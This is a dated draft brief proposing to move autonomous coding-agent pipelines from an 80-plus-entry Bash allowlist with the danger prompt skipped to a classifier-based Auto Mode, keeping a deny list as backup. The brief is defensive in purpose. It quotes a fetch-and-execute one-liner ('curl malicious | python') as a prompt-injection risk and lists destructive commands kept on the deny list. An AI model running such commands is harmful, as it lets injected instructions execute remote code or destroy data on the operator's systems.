# Daily Improvement Brief: Auto Mode for Autonomous Pipelines

**Created:** 2026-03-30
**Status:** Draft
**Type:** Daily Improvement (single auto-dev session)

---

## Problem

Our autonomous pipelines (`/auto-dev`, `/ghost`, `/auto-ship`, `/auto-build-all`) currently rely on two mechanisms for unattended operation: (1) an 80+ entry `permissions.allow` list that broadly whitelists Bash commands like `Bash(python *)`, `Bash(node *)`, `Bash(curl *)`, and (2) `skipDangerousModePermissionPrompt: true` which bypasses the safety prompt entirely. This is a brittle, hand-maintained approach that's either too permissive (a prompt injection in a fetched page could trigger `curl malicious | python`) or too restrictive (new tools require manually adding allow rules). The docs scan on 2026-03-30 discovered Claude Code now offers **Auto Mode** — a classifier-based permission mode that evaluates each tool call contextually, blocking risky ones without requiring a manual allowlist. This is strictly safer than our current setup and eliminates permission maintenance.

---

## Proposed Solution

Enable Auto Mode (`--permission-mode auto`) as the default for all autonomous pipeline runs. This involves:

1. **Update pipeline skill files** that launch autonomous sessions to pass `--permission-mode auto` (or `--enable-auto-mode`)
2. **Configure `autoMode.environment`** in settings.json to trust our repos and standard services
3. **Prune the permissions.allow list** — Auto Mode's classifier replaces most broad Bash rules; keep only the deny list as a safety net
4. **Update CLAUDE.md** to document Auto Mode as the autonomous pipeline permission model
5. **Test** by running `/auto-build` on a pending task and verifying no false permission denials

---

## Target Users

**Primary:** The automated pipelines (`/ghost`, `/auto-dev`, `/auto-ship`) that need to run unattended without permission prompts

**Secondary:** The human operator (Caleb) who currently maintains the allowlist and needs confidence that autonomous runs are safe

---

## Constraints

| Constraint | Detail |
|------------|--------|
| Technical | Auto Mode requires Sonnet 4.6 or Opus 4.6 (we use both - satisfied). May require Team plan. |
| Timeline | Single auto-dev session (~30 min) |
| Team | Solo (Claude agent) |
| Integration | Must not break existing manual workflows — Auto Mode should only apply to autonomous pipelines, not interactive sessions |

---

## Scope

### In Scope
- Add `--permission-mode auto` to ghost-run, auto-dev, auto-ship, auto-build skill definitions
- Configure `autoMode.environment` in settings.json with trusted repos/services
- Prune redundant `permissions.allow` entries that Auto Mode's classifier handles
- Keep the `permissions.deny` list as-is (defense in depth)
- Update CLAUDE.md documentation
- Test with one `/auto-build` run

### Out of Scope
- Migrating interactive sessions to Auto Mode (keep current permission model for manual work)
- Removing the deny list (keep as backup safety layer)
- Chrome integration (separate improvement)
- `--fallback-model` changes (separate improvement)
- Telegram channel migration (separate improvement)

---

## Acceptance Criteria

1. **AC1:** Ghost/auto-dev/auto-ship skill files include `--permission-mode auto` or equivalent configuration
2. **AC2:** `autoMode.environment` is configured in settings.json with the standard trusted repos and services
3. **AC3:** The `permissions.allow` list is reduced from 80+ entries to only entries that Auto Mode doesn't cover (MCP tools, specific edge cases)
4. **AC4:** The `permissions.deny` list remains unchanged (defense in depth)
5. **AC5:** CLAUDE.md documents Auto Mode as the autonomous pipeline permission model
6. **AC6:** A test `/auto-build` run completes successfully without false permission denials
7. **AC7:** Interactive sessions are NOT affected — they keep the current permission model

---

## Risk Assessment

| Risk | Likelihood | Impact | Mitigation |
|------|-----------|--------|------------|
| Auto Mode classifier blocks a legitimate tool call | Medium | Low | Keep broad allow rules as fallback initially; prune gradually |
| Auto Mode not available on current plan | Low | High | Check `claude auto-mode defaults` first; abort if unavailable |
| Breaking interactive sessions | Low | High | Only modify autonomous pipeline skills, not global settings |

---

## Implementation Approach

1. Run `claude auto-mode defaults` to verify availability and understand classifier rules
2. Read the autonomous pipeline skills (`ghost-run`, `auto-dev`, `auto-ship`, `auto-build`) to find where permission mode is set
3. Add Auto Mode configuration to each skill
4. Configure `autoMode.environment` in settings.json
5. Audit and prune `permissions.allow` — keep MCP-specific rules, remove Bash rules that Auto Mode handles
6. Update CLAUDE.md
7. Run a test `/auto-build` on a pending task

---

## Research Source

- Docs scan: https://code.claude.com/docs/en/permission-modes (Auto Mode section)
- Current config: `~/.claude/settings.json` — 80+ allow rules, `skipDangerousModePermissionPrompt: true`
- Feature discovered: 2026-03-30 daily improvement scan

---

## Feature Name

**Kebab-case identifier:** `auto-mode-pipelines`

**Folder:** `docs/brainstorm/daily-improvement-2026-03-30.md` (daily improvement, not full feature)

---

## Notes

- Auto Mode is described as using a "separate classifier model" — this adds a small latency per tool call but eliminates entire categories of permission-related failures in autonomous runs
- The `autoMode.environment` setting allows declaring trusted repos and services, reducing false blocks
- Our deny list (`rm -rf`, `git push --force`, `chmod 777`, etc.) should remain even with Auto Mode — defense in depth
- If Auto Mode isn't available on our plan, the fallback improvement is to audit and tighten the current allow list (remove overly broad rules like `Bash(curl *)`)
- Priority over Chrome integration because: Auto Mode is pure config (low effort), directly improves safety of every autonomous run, and doesn't require installing browser extensions
